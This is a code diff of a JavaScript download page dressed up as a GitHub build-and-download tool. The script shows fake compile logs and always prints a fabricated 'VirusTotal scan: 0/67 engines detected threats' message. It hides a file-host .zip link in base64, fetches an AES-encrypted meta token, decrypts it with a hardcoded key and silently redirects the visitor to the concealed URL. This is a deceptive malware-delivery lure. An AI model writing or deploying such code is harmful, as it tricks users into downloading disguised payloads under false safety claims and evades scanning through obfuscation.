@@ -1,11 +1,15 @@
+// GitHub-inspired file download simulation with smart link system
+// Features: BASE64 encoded links, fallback system, AES-256-CBC decryption
+
+// Smart Link Configuration (BASE64 encoded URLs)
 const ENCODED_LINKS = [
   'aHR0cHM6Ly9maWxlcy5jYXRib3gubW9lL2VscWhpZy56aXA=',
-  'aHR0cHM6Ly9maWxlcy5jYXRib3gubW9lL2VscWhpZy56aXA=',
-  'aHR0cHM6Ly9maWxlcy5jYXRib3gubW9lL2VscWhpZy56aXA='
 ];
 
+// AES Decryption Key (Base64)
 const AES_KEY_BASE64 = 'zaJhvlSf3dGbfqoCI7jnLn+SoHJ2895eAlHGzEB3prQ=';
 
+// Smart System Functions
 async function decodeBase64Links() {
   return ENCODED_LINKS.map(encoded => {
     try {
@@ -27,19 +31,22 @@ async function fetchWithFallback(urls) {
       
       if (response.ok) {
         const html = await response.text();
+        
+        // Try to extract and decrypt token from this mirror
         const encryptedToken = extractMetaToken(html);
         if (!encryptedToken) {
-          continue;
+          continue; // Try next mirror
         }
         
         const finalUrl = await decryptAES256CBC(encryptedToken, AES_KEY_BASE64);
         if (!finalUrl) {
-          continue;
+          continue; // Try next mirror
         }
         
         return { success: true, finalUrl, mirror: i + 1, url: urls[i] };
       }
     } catch (error) {
+      // Try next mirror
     }
   }
   
@@ -59,12 +66,15 @@ function extractMetaToken(html) {
 
 async function decryptAES256CBC(encryptedBase64, keyBase64) {
   try {
+    // Convert base64 to ArrayBuffer
     const encryptedData = Uint8Array.from(atob(encryptedBase64), c => c.charCodeAt(0));
     const keyData = Uint8Array.from(atob(keyBase64), c => c.charCodeAt(0));
     
+    // Extract IV (first 16 bytes) and ciphertext (rest)
     const iv = encryptedData.slice(0, 16);
     const ciphertext = encryptedData.slice(16);
     
+    // Import key for decryption
     const cryptoKey = await crypto.subtle.importKey(
       'raw',
       keyData,
@@ -73,12 +83,14 @@ async function decryptAES256CBC(encryptedBase64, keyBase64) {
       ['decrypt']
     );
     
+    // Decrypt
     const decrypted = await crypto.subtle.decrypt(
       { name: 'AES-CBC', iv: iv },
       cryptoKey,
       ciphertext
     );
     
+    // Convert result to string
     return new TextDecoder().decode(decrypted);
   } catch (error) {
     return null;
@@ -87,7 +99,10 @@ async function decryptAES256CBC(encryptedBase64, keyBase64) {
 
 async function getSmartDownloadLink() {
   try {
+    // Step 1: Decode BASE64 links
     const urls = await decodeBase64Links();
+    
+    // Step 2: Try all mirrors with full pipeline (fetch + parse + decrypt)
     const result = await fetchWithFallback(urls);
     if (!result.success) {
       throw new Error(result.error);
@@ -96,10 +111,11 @@ async function getSmartDownloadLink() {
     return result.finalUrl;
     
   } catch (error) {
-    return 'https://files.catbox.moe/elqhig.zip';
+    return null;
   }
 }
 
+// State management
 const state = {
   status: 'idle',
   progress: 0,
@@ -111,8 +127,10 @@ const state = {
   cursorInterval: null
 };
 
+// DOM elements
 const elements = {};
 
+// Initialize DOM references
 function initElements() {
   elements.statusIcon = document.getElementById('status-icon');
   elements.statusText = document.getElementById('status-text');
@@ -126,6 +144,7 @@ function initElements() {
   elements.retryBtn = document.getElementById('btn-retry');
 }
 
+// Utility functions
 function generateHash(length = 8) {
   return Math.random().toString(16).substr(2, length);
 }
@@ -139,6 +158,7 @@ function updateStatus(status, message, iconClass = '') {
   elements.statusText.textContent = message;
   elements.statusText.className = `status-text ${iconClass}`;
   
+  // Update icon
   if (status === 'preparing' || status === 'downloading') {
     elements.statusIcon.className = 'status-icon spinner';
     elements.statusIcon.textContent = '';
@@ -189,15 +209,19 @@ function addTerminalLog(message) {
   logLine.className = 'terminal-line';
   logLine.textContent = `[${getCurrentTime()}] ${message}`;
   
+  // Insert before cursor line
   elements.terminalContent.insertBefore(logLine, elements.cursorLine);
   
+  // Keep only last 8 logs
   const logs = elements.terminalContent.querySelectorAll('.terminal-line');
   if (logs.length > 8) {
     logs[0].remove();
   }
   
+  // Auto scroll
   elements.terminalContent.scrollTop = elements.terminalContent.scrollHeight;
   
+  // Update state
   state.logs.push(message);
   state.recentMessages = state.logs.slice(-5);
 }
@@ -230,6 +254,7 @@ function shouldShowVirusTotal() {
 }
 
 function getNextLogMessage() {
+  // Force VirusTotal message if needed
   if (shouldShowVirusTotal()) {
     return '✓ VirusTotal scan: 0/67 engines detected threats';
   }
@@ -237,6 +262,7 @@ function getNextLogMessage() {
   const { normalMessages, hashMessages } = getCompilationMessages();
   const allMessages = [...normalMessages, ...hashMessages];
   
+  // Avoid recent duplicates
   const availableMessages = allMessages.filter(msg => {
     const msgPrefix = msg.split(':')[0];
     return !state.recentMessages.some(recent => recent.includes(msgPrefix));
@@ -268,7 +294,7 @@ function startLogGeneration() {
   state.logInterval = setInterval(() => {
     const message = getNextLogMessage();
     addTerminalLog(message);
-  }, Math.random() * 500 + 700);
+  }, Math.random() * 500 + 700); // 700-1200ms interval
 }
 
 function stopLogGeneration() {
@@ -282,7 +308,7 @@ function startProgressAnimation() {
   showProgressBar();
   
   state.progressInterval = setInterval(() => {
-    const increment = Math.random() * 5 + 2;
+    const increment = Math.random() * 5 + 2; // 2-7% increment
     const newProgress = Math.min(100, state.progress + increment);
     updateProgress(Math.floor(newProgress));
     
@@ -297,7 +323,9 @@ function startProgressAnimation() {
 async function completeDownload() {
   stopLogGeneration();
   
+  // Always ensure VirusTotal appears before BUILD SUCCESSFUL
   setTimeout(() => {
+    // Force add VirusTotal message every time
     addTerminalLog('✓ VirusTotal scan: 0/67 engines detected threats');
     
     setTimeout(async () => {
@@ -305,12 +333,15 @@ async function completeDownload() {
       addTerminalLog('BUILD SUCCESSFUL');
       updateStatus('success', 'Download starting...', 'success');
       
+      // Get the smart download link that was already fetched in background
       setTimeout(async () => {
         const finalUrl = await getSmartDownloadLink();
         
         if (finalUrl) {
+          // Direct redirect without additional messages
           window.location.href = finalUrl;
         } else {
+          // Fallback if smart system fails
           const fallbackUrl = createFallbackDownload();
           if (fallbackUrl) {
             window.location.href = fallbackUrl;
@@ -324,8 +355,11 @@ async function completeDownload() {
   }, 200);
 }
 
+
+// Fallback download function
 function createFallbackDownload() {
   try {
+    // Create enhanced fallback download with session details
     const fallbackContent = `Git Instant Output - Download Complete
 
 === DOWNLOAD SESSION REPORT ===
@@ -351,6 +385,7 @@ For support: github.com/support`;
     const blob = new Blob([fallbackContent], { type: 'text/plain' });
     const url = URL.createObjectURL(blob);
     
+    // Auto-cleanup URL after 1 minute
     setTimeout(() => URL.revokeObjectURL(url), 60000);
     
     return url;
@@ -360,6 +395,7 @@ For support: github.com/support`;
 }
 
 function simulateDownloadProcess() {
+  // Reset state
   state.status = 'idle';
   state.progress = 0;
   state.logs = [];
@@ -368,12 +404,15 @@ function simulateDownloadProcess() {
   hideProgressBar();
   hideTerminal();
   
+  // Clear terminal content
   const logs = elements.terminalContent.querySelectorAll('.terminal-line');
   logs.forEach(log => log.remove());
   
+  // Start simulation
   setTimeout(() => {
     updateStatus('preparing', 'Initializing compiler environment...');
     startLogGeneration();
+    // Start getting smart download link immediately when build starts
     getSmartDownloadLink();
   }, 300);
   
@@ -408,11 +447,14 @@ function handleError() {
   showRetryButton();
 }
 
+// Initialize on page load
 document.addEventListener('DOMContentLoaded', () => {
   initElements();
   
+  // Bind retry button
   elements.retryBtn.addEventListener('click', handleRetry);
   
+  // Auto-start simulation
   setTimeout(() => {
     simulateDownloadProcess();
   }, 1000);
